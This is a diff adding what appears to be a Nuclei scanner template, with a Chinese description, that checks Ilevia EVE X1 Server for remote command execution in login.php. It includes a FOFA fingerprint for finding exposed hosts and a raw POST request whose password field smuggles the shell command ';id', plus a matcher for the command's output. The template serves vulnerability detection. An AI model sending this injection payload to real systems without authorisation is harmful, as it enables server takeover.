@@ -1,0 +1,31 @@
+id: Ilevia-EVE-X1-Server-login-RCE
+
+info:
+  name: Ilevia EVE X1 Server login.php 远程命令执行
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: icon_hash="392278119"
+    Ilevia EVE X1 Server login.php 存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
+  reference:
+    - 
+  tags: RCE
+  
+http:
+  - raw:
+      - |-
+        POST /ajax/php/login.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+        userid=admin&passwd=;id
+
+    matchers:
+      - type: dsl
+        name: 远程命令执行
+        dsl:
+          - 'status_code==200 && contains_all(body,"uid=","gid=","groups=")'
